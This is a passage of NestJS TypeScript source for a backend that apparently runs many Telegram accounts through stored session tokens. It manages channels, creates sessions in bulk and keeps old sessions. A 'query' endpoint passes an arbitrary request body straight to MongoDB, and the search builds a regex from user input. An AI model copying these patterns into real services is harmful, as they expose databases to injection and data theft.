$lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\n          }\n        },\n        {\n          $set: {\n            \"wordRestriction\": 0,\n            \"dMRestriction\": 0,\n            \"banned\": false,\n            \"availableMsgs\": keys\n          }\n        }\n      );\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async updateBannedChannels() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for update banned Channels`);\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\n      $set: {\n        \"wordRestriction\": 0,\n        \"dMRestriction\": 0,\n        banned: false,\n        \"private\": false\n      }\n    })\n  }\n}\n","// src/activechannels/dto/create-activechannel.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateActiveChannelDto {\n  @ApiProperty()\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: 300 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: true })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: false })\n  reactRestricted?: boolean = false;\n\n  @ApiProperty()\n  title: string;\n\n  @ApiProperty()\n  username: string;\n\n  @ApiProperty({ default: 0 })\n  wordRestriction?: number = 0;\n\n  @ApiProperty({ default: 0 })\n  dMRestriction?: number = 0;\n\n  @ApiProperty({ type: [String] })\n  availableMsgs?: string[];\n\n  @ApiProperty({ default: false })\n  banned?: boolean = false;\n\n  @ApiProperty({ default: true, required: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ default: false, required: false })\n  forbidden?: boolean\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n}\n","// src/activechannels/dto/update-activechannel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\n\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { defaultMessages, defaultReactions } from '../../../utils';\n\nexport type ActiveChannelDocument = ActiveChannel & Document;\n\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n })\nexport class ActiveChannel {\n  @ApiProperty({ required: true })\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @ApiProperty({ required: true })\n  @Prop({ required: true })\n  title: string;\n\n  @ApiProperty({ required: false, default: null })\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  wordRestriction: number;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  dMRestriction: number;\n\n  @ApiProperty({ type: [String], default:defaultMessages })\n  @Prop({ type: [String], default: defaultMessages })\n  availableMsgs: string[];\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  banned: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  megagroup: boolean;\n\n  @ApiProperty({ default: false})\n  @Prop({ default: false })\n  private: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  reactRestricted: boolean\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  forbidden: boolean\n}\n\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put, HttpStatus, BadRequestException } from '@nestjs/common';\nimport { \n  ApiTags, \n  ApiOperation, \n  ApiBody, \n  ApiQuery, \n  ApiResponse, \n  ApiParam,\n  ApiOkResponse,\n  ApiBadRequestResponse,\n  ApiNotFoundResponse,\n  ApiInternalServerErrorResponse \n} from '@nestjs/swagger';\nimport { ArchivedClient } from './schemas/archived-client.schema';\nimport { ArchivedClientService } from './archived-client.service';\nimport { CreateArchivedClientDto } from './dto/create-archived-client.dto';\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\nimport { SessionUpdateDto } from './dto/session-update.dto';\nimport { CleanupSessionsDto } from './dto/cleanup-sessions.dto';\nimport { MaintenanceResultDto } from './dto/maintenance-result.dto';\nimport { SessionStatusDto, SessionHealthMetricsDto } from './dto/session-status.dto';\n\n@ApiTags('Archived Clients')\n@Controller('archived-clients')\nexport class ArchivedClientController {\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\n\n  @Post()\n  @ApiOperation({ \n    summary: 'Create new archived client', \n    description: 'Creates a new archived client record with session information. Used when a Telegram client becomes inactive but needs to be preserved for potential future reactivation.' \n  })\n  @ApiBody({ \n    type: CreateArchivedClientDto,\n    description: 'Archived client data including mobile number and session token'\n  })\n  @ApiOkResponse({ \n    description: 'Archived client successfully created',\n    type: ArchivedClient\n  })\n  @ApiBadRequestResponse({ description: 'Invalid input data provided' })\n  @ApiInternalServerErrorResponse({ description: 'Internal server error occurred' })\n  async create(@Body() createArchivedClientDto: CreateArchivedClientDto): Promise<ArchivedClient> {\n    return this.archivedclientService.create(createArchivedClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ \n    summary: 'Search archived clients', \n    description: 'Search for archived clients using various filter criteria. Supports partial matching for names and exact matching for other fields.' \n  })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Unique client identifier' })\n  @ApiQuery({ name: 'dbcoll', required: false, description: 'Database collection name for filtering' })\n  @ApiQuery({ name: 'channelLink', required: false, description: 'Associated channel link' })\n  @ApiQuery({ name: 'link', required: false, description: 'Client profile link' })\n  @ApiQuery({ name: 'firstName', required: false, description: 'First name (supports partial matching)' })\n  @ApiOkResponse({ \n    description: 'List of archived clients matching search criteria',\n    type: [ArchivedClient]\n  })\n  @ApiBadRequestResponse({ description: 'Invalid search parameters' })\n  async search(@Query() query: SearchClientDto): Promise<ArchivedClient[]> {\n    return this.archivedclientService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ \n    summary: 'Get all archived clients', \n    description: 'Retrieves a complete list of all archived clients in the system. Use with caution on large datasets.' \n  })\n  @ApiOkResponse({ \n    description: 'Complete list of all archived clients',\n    type: [ArchivedClient]\n  })\n  @ApiInternalServerErrorResponse({ description: 'Database error occurred' })\n  async findAll(): Promise<ArchivedClient[]> {\n    return this.archivedclientService.findAll();\n  }\n  \n  @Get('maintenance/check-archived-clients')\n  @ApiOperation({ \n    summary: 'Run archived clients maintenance check', \n    description: 'Performs comprehensive maintenance on all archived clients including session validation, profile updates, and cleanup of inactive sessions. This is a long-running operation that should be used during maintenance windows.' \n  })\n  @ApiOkResponse({ \n    description: 'Maintenance check completed successfully',\n    schema: {\n      type: 'string',\n      example: 'Archived clients check completed. Processed: 150, Updated: 23, Deleted: 5, Errors: 2'\n    }\n  })\n  @ApiInternalServerErrorResponse({ description: 'Maintenance operation failed' })\n  async checkArchivedClients(): Promise<string> {\n    return this.archivedclientService.checkArchivedClients();\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ \n    summary: 'Get archived client by mobile number', \n    description: 'Retrieves a specific archived client using their mobile number. Returns null if not found.' \n  })\n  @ApiParam({ \n    name: 'mobile', \n    description: 'Mobile number of the archived client',\n    example: '916265240911'\n  })\n  @ApiOkResponse({ \n    description: 'Archived client found',\n    type: ArchivedClient\n  })\n  @ApiNotFoundResponse({ description: 'Archived client not found' })\n  async findOne(@Param('mobile') mobile: string): Promise<ArchivedClient> {\n    return this.archivedclientService.findOne(mobile);\n  }\n  \n  @Get('fetch/:mobile')\n  @ApiOperation({ \n    summary: 'Fetch or create archived client', \n    description: 'Retrieves an archived client by mobile number. If not found, creates a new session and archived client record automatically.' \n  })\n  @ApiParam({ \n    name: 'mobile', \n    description: 'Mobile number of the client',\n    example: '916265240911'\n  })\n  @ApiOkResponse({ \n    description: 'Archived client retrieved or created',\n    type: ArchivedClient\n  })\n  @ApiNotFoundResponse({ description: 'Could not create session for the mobile number' })\n  @ApiInternalServerErrorResponse({ description: 'Session creation failed' })\n  async fetchOne(@Param('mobile') mobile: string): Promise<ArchivedClient> {\n    return this.archivedclientService.fetchOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ \n    summary: 'Update archived client', \n    description: 'Updates an existing archived client record. Uses upsert operation - creates if not exists.' \n  })\n  @ApiParam({ \n    name: 'mobile', \n    description: 'Mobile number of the archived client',\n    example: '916265240911'\n  })\n  @ApiBody({ \n    type: UpdateClientDto,\n    description: 'Fields to update (partial update supported)'\n  })\n  @ApiOkResponse({ \n    description: 'Archived client updated successfully',\n    type: ArchivedClient\n  })\n  @ApiBadRequestResponse({ description: 'Invalid update data' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<ArchivedClient> {\n    return this.archivedclientService.update(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ \n    summary: 'Delete archived client', \n    description: 'Permanently removes an archived client record from the system.' \n  })\n  @ApiParam({ \n    name: 'mobile', \n    description: 'Mobile number of the archived client to delete',\n    example: '916265240911'\n  })\n  @ApiOkResponse({ \n    description: 'Archived client deleted successfully',\n    type: ArchivedClient\n  })\n  @ApiNotFoundResponse({ description: 'Archived client not found' })\n  async remove(@Param('mobile') mobile: string): Promise<ArchivedClient> {\n    return this.archivedclientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ \n    summary: 'Execute custom MongoDB query', \n    description: 'Executes a custom MongoDB query against the archived clients collection. Use with caution as this provides direct database access.' \n  })\n  @ApiBody({\n    description: 'MongoDB query object',\n    schema: {\n      type: 'object',\n      example: {\n        mobile: '916265240911'\n      }\n    }\n  })\n  @ApiOkResponse({ \n    description: 'Query executed successfully',\n    schema: {\n      type: 'array',\n      items: { $ref: '#/components/schemas/ArchivedClient' }\n    }\n  })\n  @ApiBadRequestResponse({ description: 'Invalid query provided' })\n  @ApiInternalServerErrorResponse({ description: 'Query execution failed' })\n  async executeQuery(@Body() query: object): Promise<any> {\n    if (!query || Object.keys(query).length === 0) {\n      throw new BadRequestException('Query cannot be empty');\n    }\n    return await this.archivedclientService.executeQuery(query);\n  }\n\n  @Put(':mobile/session')\n  @ApiOperation({ \n    summary: 'Update session with backup', \n    description: 'Updates the main session for an archived client. If the current session is still active, it will be backed up to oldSessions array before being replaced.' \n  })\n  @ApiParam({ \n    name: 'mobile', \n    description: 'Mobile number of the archived client',\n    example: '916265240911'\n  })\n  @ApiBody({ \n    type: SessionUpdateDto,\n    description: 'New session data'\n  })\n  @ApiOkResponse({ \n    description: 'Session updated successfully',\n    type: ArchivedClient\n  })\n  @ApiNotFoundResponse({ description: 'Archived client not found' })\n  @ApiBadRequestResponse({ description: 'Invalid session token provided' })\n  async updateSession(\n    @Param('mobile') mobile: string, \n    @Body() sessionUpdateDto: SessionUpdateDto\n  ): Promise<ArchivedClient> {\n    return this.archivedclientService.updateSession(mobile, sessionUpdateDto.newSession);\n  }\n\n  @Get(':mobile/old-sessions')\n  @ApiOperation({ \n    summary: 'Get old sessions for client', \n    description: 'Retrieves all old session tokens stored for an archived client. These are previous sessions that were backed up when new sessions were set.' \n  })\n  @ApiParam({ \n    name: 'mobile', \n    description: 'Mobile number of the archived client',\n    example: '916265240911'\n  })\n  @ApiOkResponse({ \n    description: 'List of old session tokens',\n    schema: {\n      type: 'array',\n      items: {\n        type: 'string',\n        description: 'Session token'\n      },\n      example: ['1BQANOTEuM==', '2CRANOTEuN==', '3DRANOTEuO==']\n    }\n  })\n  @ApiNotFoundResponse({ description: 'Archived client not found' })\n  @ApiBadRequestResponse({ description: 'Mobile number is required' })\n  async getOldSessions(@Param('mobile') mobile: string): Promise<string[]> {\n    return this.archivedclientService.getOldSessions(mobile);\n  }\n\n  @Post(':mobile/cleanup-sessions')\n  @ApiOperation({ \n    summary: 'Clean up old sessions', \n    description: 'Removes inactive old sessions and limits the number of stored old sessions. Only keeps the most recent active sessions up to the specified limit.' \n  })\n  @ApiParam({ \n    name: 'mobile', \n    description: 'Mobile number of the archived client',\n    example: '916265240911'\n  })\n  @ApiBody({ \n    type: CleanupSessionsDto,\n    description: 'Cleanup configuration',\n    required: false\n  })\n  @ApiOkResponse({ \n    description: 'Session cleanup completed successfully',\n    type: ArchivedClient\n  })\n  @ApiNotFoundResponse({ description: 'Archived client not found' })\n  @ApiBadRequestResponse({ description: 'Invalid maxSessions value' })\n  async cleanupOldSessions(\n    @Param('mobile') mobile: string,\n    @Body() cleanupDto?: CleanupSessionsDto\n  ): Promise<ArchivedClient> {\n    return this.archivedclientService.cleanupOldSessions(mobile, cleanupDto?.maxSessions);\n  }\n\n  @Get(':mobile/session-status')\n  @ApiOperation({ \n    summary: 'Check session status', \n    description: 'Checks if the current session for an archived client is active. This is useful for verifying session health before performing operations.' \n  })\n  @ApiParam({ \n    name: 'mobile', \n    description: 'Mobile number of the archived client',\n    example: '916265240911'\n  })\n  @ApiOkResponse({ \n    description: 'Session status information',\n    type: SessionStatusDto\n  })\n  @ApiNotFoundResponse({ description: 'Archived client not found' })\n  async checkSessionStatus(@Param('mobile') mobile: string): Promise<SessionStatusDto> {\n    return this.archivedclientService.getSessionStatus(mobile);\n  }\n\n  @Post('batch-fetch')\n  @ApiOperation({ \n    summary: 'Batch fetch sessions for multiple mobiles', \n    description: 'Efficiently retrieves or creates active sessions for multiple mobile numbers in a single request. Useful for bulk operations.' \n  })\n  @ApiBody({ \n    description: 'Array of mobile numbers to process',\n    schema: {\n      type: 'object',\n      properties: {\n        mobiles: {\n          type: 'array',\n          items: { type: 'string' },\n          maxItems: 50,\n          example: ['916265240911', '916265240912', '916265240913']\n        }\n      },\n      required: ['mobiles']\n    }\n  })\n  @ApiOkResponse({ \n    description: 'Batch processing results',\n    schema: {\n      type: 'array',\n      items: {\n        type: 'object',\n        properties: {\n          mobile: { type: 'string' },\n          client: { $ref: '#/components/schemas/ArchivedClient' },\n          error: { type: 'string' }\n        }\n      }\n    }\n  })\n  @ApiBadRequestResponse({ description: 'Invalid batch request or too many mobiles' })\n  async batchFetchSessions(@Body('mobiles') mobiles: string[]): Promise<{ \n    mobile: string; \n    client: ArchivedClient | null; \n    error?: string \n  }[]> {\n    return this.archivedclientService.batchFetchSessions(mobiles);\n  }\n\n  @Get('health/cache-stats')\n  @ApiOperation({ \n    summary: 'Get session validation cache statistics', \n    description: 'Returns statistics about the internal session validation cache for monitoring and debugging purposes.' \n  })\n  @ApiOkResponse({ \n    description: 'Cache statistics',\n    schema: {\n      type: 'object',\n      properties: {\n        totalEntries: { type: 'number', example: 150 },\n        validEntries: { type: 'number', example: 120 },\n        expiredEntries: { type: 'number', example: 30 },\n        cacheHitRate: { type: 'string', example: '85%' },\n        lastCleanup: { type: 'string', format: 'date-time' }\n      }\n    }\n  })\n  async getCacheStats(): Promise<{\n    totalEntries: number;\n    validEntries: number;\n    expiredEntries: number;\n    cacheHitRate: string;\n    lastCleanup: string;\n  }> {\n    return (this.archivedclientService as any).getCacheStatistics();\n  }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ArchivedClientSchema } from './schemas/archived-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ArchivedClientService } from './archived-client.service';\nimport { ArchivedClientController } from './archived-client.controller';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ collection: 'archivedClients', name: 'ArchivedClient', schema: ArchivedClientSchema }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [ArchivedClientController],\n  providers: [ArchivedClientService],\n  exports: [ArchivedClientService]\n})\nexport class ArchivedClientModule { }\n","import {\n    BadRequestException,\n    Inject,\n    Injectable,\n    InternalServerErrorException,\n    NotFoundException,\n    forwardRef,\n    Logger\n} from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { CreateArchivedClientDto } from './dto/create-archived-client.dto';\nimport { ArchivedClient, ArchivedClientDocument } from './schemas/archived-client.schema';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { ClientService } from '../clients/client.service';\nimport { parseError } from '../../utils/parseError';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n@Injectable()\nexport class ArchivedClientService {\n    private readonly logger = new Logger(ArchivedClientService.name);\n    private readonly MAX_OLD_SESSIONS = 10;\n    private readonly SESSION_GENERATION_TIMEOUT = 30000; // 30 seconds\n    private readonly MAX_RETRY_ATTEMPTS = 3;\n    private readonly SESSION_VALIDATION_CACHE = new Map<string, { isValid: boolean; timestamp: number }>();\n    private readonly CACHE_EXPIRY = 5 * 60 * 1000; // 5 minutes\n\n    constructor(\n        @InjectModel('ArchivedClient') private archivedclientModel: Model<ArchivedClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) {\n    }\n\n    async create(createArchivedClientDto: CreateArchivedClientDto): Promise<ArchivedClient> {\n        try {\n            this.logger.log(`Creating new archived client for mobile: ${createArchivedClientDto.mobile}`);\n\n            const createdUser = new this.archivedclientModel({\n                ...createArchivedClientDto,\n                createdAt: new Date(),\n                sessionHistory: [{\n                    session: createArchivedClientDto.session,\n                    createdAt: new Date(),\n                    status: 'active',\n                    source: 'initial_creation'\n                }]\n            });\n\n            const result = await createdUser.save();\n            this.logger.log(`Successfully created archived client for mobile: ${createArchivedClientDto.mobile}`);\n            return result;\n        } catch (error) {\n            this.logger.error(`Failed to create archived client for mobile ${createArchivedClientDto.mobile}:`, error);\n            throw new InternalServerErrorException(`Failed to create archived client: ${error.message}`);\n        }\n    }\n\n    async findAll(): Promise<ArchivedClient[]> {\n        const results: ArchivedClient[] = await this.archivedclientModel.find().exec();\n        return results\n    }\n\n    async findOne(mobile: string): Promise<ArchivedClient> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        return user;\n    }\n\n    /**\n     * Core session factory method - Always provides a valid, active session\n     * This is the primary method for obtaining sessions per mobile number\n     */\n    async fetchOne(mobile: string): Promise<ArchivedClient> {\n        if (!mobile) {\n            throw new BadRequestException('Mobile number is required');\n        }\n\n        this.logger.log(`Session factory request for mobile: ${mobile}`);\n\n        try {\n            // First, try to get existing client\n            const archivedClient = await this.findOne(mobile);\n\n            if (archivedClient) {\n                this.logger.log(`Found existing archived client for ${mobile}`);\n\n                // Check if current session is still active\n                const isCurrentSessionActive = await this.isSessionActive(mobile, archivedClient.session);\n\n                if (isCurrentSessionActive) {\n                    this.logger.log(`Current session for ${mobile} is active, returning existing session`);\n                    await this.auditSessionAccess(mobile, archivedClient.session, 'session_reused');\n                    return archivedClient;\n                }\n\n                this.logger.log(`Current session for ${mobile} is inactive, attempting to find active session from history`);\n\n                // Try to find an active session from old sessions\n                const activeSession = await this.findActiveSessionFromHistory(archivedClient);\n\n                if (activeSession) {\n                    this.logger.log(`Found active session in history for ${mobile}, promoting it`);\n                    return await this.promoteActiveSession(mobile, activeSession, archivedClient);\n                }\n\n                // No active sessions found, generate new one\n                this.logger.log(`No active sessions found for ${mobile}, generating new session`);\n                return await this.generateAndUpdateSession(mobile, archivedClient);\n            } else {\n                // New client, create session from scratch\n                this.logger.log(`New client ${mobile}, creating fresh session`);\n                return await this.createNewClientWithSession(mobile);\n            }\n        } catch (error) {\n            this.logger.error(`Session factory failed for mobile ${mobile}:`, error);\n            throw new InternalServerErrorException(`Session generation failed: ${parseError(error).message}`);\n        }\n    }\n\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<ArchivedClient> {\n        delete updateClientDto[\"_id\"]\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        console.log({ ...updateClientDto });\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        return updatedUser;\n    }\n\n    async remove(mobile: string): Promise<ArchivedClient> {\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${mobile}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<ArchivedClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.archivedclientModel.find(filter).exec();\n    }\n\n    async checkArchivedClients() {\n        console.log('Starting archived clients check...');\n        await sleep(2000);\n\n        const archivedClients = await this.findAll();\n        const clients = await this.clientService.findAll();\n        const clientIds = clients.map(client => client.mobile);\n\n        console.log(`Found ${archivedClients.length} archived clients to check`);\n\n        let processedCount = 0;\n        let updatedCount = 0;\n        let deletedCount = 0;\n        let errorCount = 0;\n\n        // Process each archived client sequentially to avoid overwhelming the system\n        for (const document of archivedClients) {\n            try {\n                processedCount++;\n                console.log(`Processing ${processedCount}/${archivedClients.length}: ${document.mobile}`);\n\n                if (!clientIds.includes(document.mobile)) {\n                    // This is truly an archived client, not an active one\n                    const sessionCheckResult = await this.checkAndUpdateMainSession(document);\n\n                    if (sessionCheckResult.updated) {\n                        updatedCount++;\n                        console.log(`Updated session for archived client ${document.mobile}`);\n                    }\n\n                    // Clean up old sessions for this client\n                    await this.cleanupOldSessions(document.mobile, 3); // Keep only 3 old sessions for archived clients\n\n                    // Try to update the account to show it's deleted\n                    try {\n                        const currentClient = await this.findOne(document.mobile);\n                        if (currentClient && currentClient.session) {\n                            await connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            console.log(`Updated Telegram profile for archived client ${document.mobile}`);\n                        }\n                    } catch (telegramError) {\n                        console.log(`Could not update Telegram profile for ${document.mobile}:`, telegramError.message);\n\n                        // If all sessions are dead, consider removing this archived client\n                        if (sessionCheckResult.allSessionsDead) {\n                            try {\n                                await this.remove(document.mobile);\n                                deletedCount++;\n                                console.log(`Removed archived client ${document.mobile} - all sessions dead`);\n                            } catch (removeError) {\n                                console.log(`Could not remove dead archived client ${document.mobile}:`, removeError.message);\n                            }\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(document.mobile);\n                    }\n                } else {\n                    console.log(`${document.mobile} is an active client, skipping archived client processing`);\n                }\n\n                // Add small delay between processing clients\n                await sleep(1000);\n\n            } catch (error) {\n                errorCount++;\n                console.log(`Error processing archived client ${document.mobile}:`, error.message);\n            }\n        }\n\n        const summary = {\n            total: archivedClients.length,\n            processed: processedCount,\n            updated: updatedCount,\n            deleted: deletedCount,\n            errors: errorCount\n        };\n\n        console.log('Archived clients check completed:', summary);\n        return `Archived clients check completed. Processed: ${processedCount}, Updated: ${updatedCount}, Deleted: ${deletedCount}, Errors: ${errorCount}`;\n    }\n\n    private async checkAndUpdateMainSession(archivedClient: ArchivedClient): Promise<{ updated: boolean, allSessionsDead: boolean }> {\n        const mobile = archivedClient.mobile;\n        console.log(`Checking main session for ${mobile}...`);\n\n        // Check if main session is active\n        const isMainSessionActive = await this.isSessionActive(mobile, archivedClient.session);\n\n        if (isMainSessionActive) {\n            console.log(`Main session for ${mobile} is active`);\n            return { updated: false, allSessionsDead: false };\n        }\n\n        console.log(`Main session for ${mobile} is inactive, checking old sessions...`);\n\n        const oldSessions = archivedClient.oldSessions || [];\n        if (oldSessions.length === 0) {\n            console.log(`No old sessions available for ${mobile}`);\n            return { updated: false, allSessionsDead: true };\n        }\n\n        // Check old sessions to find an active one\n        for (let i = oldSessions.length - 1; i >= 0; i--) { // Start from most recent\n            const oldSession = oldSessions[i];\n            console.log(`Testing old session ${i + 1}/${oldSessions.length} for ${mobile}...`);\n\n            try {\n                const isOldSessionActive = await this.isSessionActive(mobile, oldSession);\n\n                if (isOldSessionActive) {\n                    console.log(`Found active old session for ${mobile}, promoting to main session`);\n\n                    // Promote this old session to main session\n                    const remainingOldSessions = oldSessions.filter((_, index) => index !== i);\n                    // Add the old main session to old sessions\n                    remainingOldSessions.unshift(archivedClient.session);\n\n                    // Limit old sessions\n                    const trimmedOldSessions = remainingOldSessions.slice(0, this.MAX_OLD_SESSIONS);\n\n                    await this.archivedclientModel.findOneAndUpdate(\n                        { mobile },\n                        {\n                            $set: {\n                                session: oldSession,\n                                oldSessions: trimmedOldSessions\n                            }\n                        },\n                        { new: true }\n                    ).exec();\n\n                    console.log(`Successfully promoted old session to main session for ${mobile}`);\n                    return { updated: true, allSessionsDead: false };\n                }\n            } catch (error) {\n                console.log(`Error checking old session for ${mobile}:`, error.message);\n            }\n        }\n\n        console.log(`No active sessions found for ${mobile}`);\n        return { updated: false, allSessionsDead: true };\n    }\n\n    async executeQuery(query: any): Promise<any> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            return await this.archivedclientModel.find(query).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    private async backupCurrentSession(archivedClient: ArchivedClient): Promise<{ oldSessions: string[] }> {\n        const currentSession = archivedClient.session;\n        const oldSessions = archivedClient.oldSessions || [];\n        oldSessions.push(currentSession);\n\n        if (oldSessions.length > this.MAX_OLD_SESSIONS) {\n            oldSessions.splice(0, oldSessions.length - this.MAX_OLD_SESSIONS);\n        }\n\n        return { oldSessions };\n    }\n\n    /**\n     * Enhanced session validation with caching and comprehensive checks\n     */\n    private async isSessionActive(mobile: string, session: string): Promise<boolean> {\n        if (!session || session.trim().length === 0) {\n            return false;\n        }\n\n        const cacheKey = `${mobile}:${session.substring(0, 20)}`;\n\n        // Check cache first\n        const cached = this.SESSION_VALIDATION_CACHE.get(cacheKey);\n        if (cached && (Date.now() - cached.timestamp) < this.CACHE_EXPIRY) {\n            this.logger.debug(`Using cached session validation for ${mobile}`);\n            return cached.isValid;\n        }\n\n        let isActive = false;\n        try {\n            this.logger.debug(`Validating session for ${mobile}...`);\n\n            // Try to validate by attempting connection (more thorough but expensive)\n            this.logger.debug(`Attempting connection validation for ${mobile}`);\n\n            const connectionTimeout = new Promise<never>((_, reject) =>\n                setTimeout(() => reject(new Error('Connection timeout')), 10000)\n            );\n\n            await Promise.race([\n                connectionManager.getClient(mobile, { autoDisconnect: true, handler: false }),\n                connectionTimeout\n            ]);\n\n            isActive = true;\n            this.logger.debug(`Connection validation successful for ${mobile}`);\n\n        } catch (error) {\n            isActive = false;\n            this.logger.debug(`Session validation failed for ${mobile}: ${error.message}`);\n        } finally {\n            await this.safeCleanupConnection(mobile);\n        }\n\n        // Update cache\n        this.SESSION_VALIDATION_CACHE.set(cacheKey, {\n            isValid: isActive,\n            timestamp: Date.now()\n        });\n\n        // Clean up old cache entries periodically\n        if (this.SESSION_VALIDATION_CACHE.size > 1000) {\n            this.cleanupValidationCache();\n        }\n\n        return isActive;\n    }\n\n    /**\n     * Cleans up expired cache entries\n     */\n    private cleanupValidationCache(): void {\n        const now = Date.now();\n        for (const [key, value] of this.SESSION_VALIDATION_CACHE.entries()) {\n            if (now - value.timestamp > this.CACHE_EXPIRY) {\n                this.SESSION_VALIDATION_CACHE.delete(key);\n            }\n        }\n        this.logger.debug(`Cleaned up validation cache, remaining entries: ${this.SESSION_VALIDATION_CACHE.size}`);\n    }\n\n    /**\n     * Production-grade session update with comprehensive validation and backup\n     */\n    async updateSession(mobile: string, newSession: string): Promise<ArchivedClient> {\n        if (!mobile) {\n            throw new BadRequestException('Mobile number is required');\n        }\n\n        if (!newSession || newSession.trim().length === 0) {\n            throw new BadRequestException('New session token is required and cannot be empty');\n        }\n\n        this.logger.log(`Updating session for mobile: ${mobile}`);\n\n        try {\n            const archivedClient = await this.findOne(mobile);\n            if (!archivedClient) {\n                throw new NotFoundException(`Archived client with mobile \"${mobile}\" not found`);\n            }\n\n            // Validate the new session first\n            const isNewSessionValid = await this.isSessionActive(mobile, newSession);\n            if (!isNewSessionValid) {\n                this.logger.warn(`New session provided for ${mobile} is not valid`);\n                // Still proceed as the session might become valid later\n            }\n\n            const updateData: any = {\n                session: newSession,\n                lastUpdated: new Date()\n            };\n\n            // Check if current session is still active and needs backup\n            try {\n                const isCurrentSessionActive = await this.isSessionActive(mobile, archivedClient.session);\n\n                if (isCurrentSessionActive && archivedClient.session !== newSession) {\n                    this.logger.log(`Current session for ${mobile} is active, backing up before update`);\n\n                    const backupData = await this.backupCurrentSession(archivedClient);\n                    updateData.oldSessions = backupData.oldSessions;\n\n                    await this.auditSessionAccess(mobile, archivedClient.session, 'session_backed_up_before_update');\n                } else {\n                    this.logger.log(`Current session for ${mobile} is inactive, replacing without backup`);\n                }\n            } catch (error) 